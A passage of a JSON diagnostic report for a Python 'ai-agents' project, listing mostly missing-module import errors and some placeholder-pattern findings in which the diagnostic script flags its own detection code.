        "timestamp": "2025-09-05T17:30:34.743955"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\emergency_response.py",
        "issue": "Module not found: autonomous_security",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.753385"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\emergency_response.py",
        "issue": "Module not found: behavioral_monitoring",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.755349"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\threat_detection.py",
        "issue": "Module not found: autonomous_security",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.766047"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\threat_detection.py",
        "issue": "Module not found: behavioral_monitoring",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.767039"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\__init__.py",
        "issue": "Module not found: services",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.773088"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\__init__.py",
        "issue": "Module not found: autonomous_security",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.774108"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\__init__.py",
        "issue": "Module not found: events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.774974"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\events.py",
        "issue": "Module not found: interfaces",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.778034"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\services.py",
        "issue": "Module not found: interfaces",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.788158"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\__init__.py",
        "issue": "Module not found: interfaces",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.793199"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\__init__.py",
        "issue": "Module not found: events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.794087"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\__init__.py",
        "issue": "Module not found: services",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.795055"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\events\\security_events.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.798024"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\events\\__init__.py",
        "issue": "Module not found: security_events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.800637"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.808285"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\__init__.py",
        "issue": "Module not found: security_service",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.813141"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\events\\reasoning_events.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.815954"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\events\\__init__.py",
        "issue": "Module not found: reasoning_events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.818298"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\services\\reasoning_service.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.824506"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\services\\__init__.py",
        "issue": "Module not found: reasoning_service",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.829243"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\caching\\__init__.py",
        "issue": "Module not found: redis_cache",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.835103"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\__init__.py",
        "issue": "Module not found: async_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.956128"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\__init__.py",
        "issue": "Module not found: algorithm_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.956976"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "issue": "Module not found: objgraph",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.968743"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\__init__.py",
        "issue": "Module not found: cpu_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.982501"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\__init__.py",
        "issue": "Module not found: memory_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.983349"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\__init__.py",
        "issue": "Module not found: performance_dashboard",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.984180"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.990921"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\__init__.py",
        "issue": "Module not found: deployment_service",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.996166"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\orchestration_service.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.000402"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\__init__.py",
        "issue": "Module not found: orchestration_service",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.006305"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\events\\autonomous_events.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.008708"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\events\\__init__.py",
        "issue": "Module not found: autonomous_events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.010834"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\repositories\\agent_repository.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.012976"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\repositories\\__init__.py",
        "issue": "Module not found: agent_repository",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.014922"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\services\\autonomous_service.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.018068"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\services\\__init__.py",
        "issue": "Module not found: autonomous_service",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.022772"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: torch",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.035331"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.environments.trading_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.058714"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.environments.supply_chain_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.063294"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.environments.resource_allocation_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.066764"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.environments.base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.070968"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.algorithms.ppo_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.075916"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.training.training_pipeline",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.079367"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.training.curriculum",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.082730"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "issue": "Module not found: rl.training.curriculum",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.090199"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "issue": "Module not found: torch",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.099589"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "issue": "Module not found: rl.environments.trading_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.104628"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "issue": "Module not found: rl.environments.base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.111578"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "issue": "Module not found: rl.algorithms.ppo_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.115366"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "issue": "Module not found: api.database.base",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.323668"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "issue": "Module not found: core.coordination.integration_layer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.323902"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: torch",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.351837"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: rl.environments.base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.358870"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: rl.environments.trading_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.363741"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: rl.environments.supply_chain_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.367417"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: rl.environments.resource_allocation_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.372336"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: rl.algorithms.ppo_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.378046"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: rl.training.curriculum",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.382863"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "issue": "Module not found: rl.training.training_pipeline",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.386599"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "issue": "Module not found: azure.cognitiveservices.vision.computervision",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.585666"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "issue": "Module not found: azure.cognitiveservices.vision.computervision.models",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.586550"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "issue": "Module not found: azure.core.credentials",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.587662"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "issue": "Module not found: strategy_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.701913"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "issue": "Module not found: pattern_recognizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.702818"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "issue": "Module not found: knowledge_transfer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.703786"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\__init__.py",
        "issue": "Module not found: meta_learning_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.716677"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\__init__.py",
        "issue": "Module not found: strategy_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.717522"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\__init__.py",
        "issue": "Module not found: pattern_recognizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.718349"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\__init__.py",
        "issue": "Module not found: knowledge_transfer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.719182"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "issue": "Module not found: meta_orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.739788"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\meta_orchestrator.py",
        "issue": "Module not found: specialized_agents",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.753366"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\__init__.py",
        "issue": "Module not found: meta_orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.785935"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\__init__.py",
        "issue": "Module not found: specialized_agents",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.786819"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\__init__.py",
        "issue": "Module not found: agent_protocol",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.787973"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\predictive_coordinator.py",
        "issue": "Module not found: temporal_engine",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.851449"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\predictive_coordinator.py",
        "issue": "Module not found: time_series_processor",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.852502"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\predictive_coordinator.py",
        "issue": "Module not found: causal_inference",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.853552"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_agent.py",
        "issue": "Module not found: temporal_engine",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.861875"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\__init__.py",
        "issue": "Module not found: temporal_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.880345"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\__init__.py",
        "issue": "Module not found: temporal_engine",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.881194"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\__init__.py",
        "issue": "Module not found: time_series_processor",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.882032"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\__init__.py",
        "issue": "Module not found: causal_inference",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.882869"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\__init__.py",
        "issue": "Module not found: predictive_coordinator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:35.883696"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 112: Placeholder implementation - def diagnose_placeholders(self) -> Dict[str, Any]:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810461"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 113: Placeholder implementation - \"\"\"Find placeholder functions and incomplete implementations\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810478"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 114: Placeholder implementation - logger.info(\"Identifying placeholder implementations...\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810485"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 116: Placeholder implementation - placeholders = []",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810491"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 130: Placeholder implementation - # Check for common placeholder patterns",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810525"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 132: Placeholder implementation - 'pass', 'todo', 'fixme', 'not implemented',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810534"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 133: Placeholder implementation - 'placeholder', 'mock', 'stub', 'return none',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810539"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 134: Placeholder implementation - 'raise notimplementederror', 'coming soon'",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810544"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 137: Placeholder implementation - if self._is_problematic_placeholder(line, lines, i-1):",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810553"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 139: Placeholder implementation - \"PLACEHOLDER\",",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810559"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 141: Placeholder implementation - f\"Line {i}: Placeholder implementation - {line.strip()}\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810565"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 143: Placeholder implementation - placeholders.append({",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810571"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 150: Placeholder implementation - self.add_warning(\"PLACEHOLDER_ANALYSIS\", str(file_path), f\"Failed to analyze: {e}\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810585"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 153: Placeholder implementation - \"placeholders_found\": len(placeholders),",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810592"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 154: Placeholder implementation - \"placeholder_details\": placeholders",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810598"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 157: Placeholder implementation - def _is_problematic_placeholder(self, line: str, all_lines: List[str], line_index: int) -> bool:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810605"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 158: Placeholder implementation - \"\"\"Check if a placeholder is actually problematic\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810610"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 163: Placeholder implementation - 'raise notimplementederror',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810622"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 164: Placeholder implementation - 'todo',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810626"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 165: Placeholder implementation - 'fixme',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810630"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 166: Placeholder implementation - 'not implemented',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810635"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 167: Placeholder implementation - 'placeholder'",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810639"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 373: Placeholder implementation - if 'your_key_here' in content.lower() or 'placeholder' in content.lower():",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.810939"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 374: Placeholder implementation - self.add_warning(\"CONFIG\", str(env_path), \"Contains placeholder values\")",
        "severity": "ERROR",
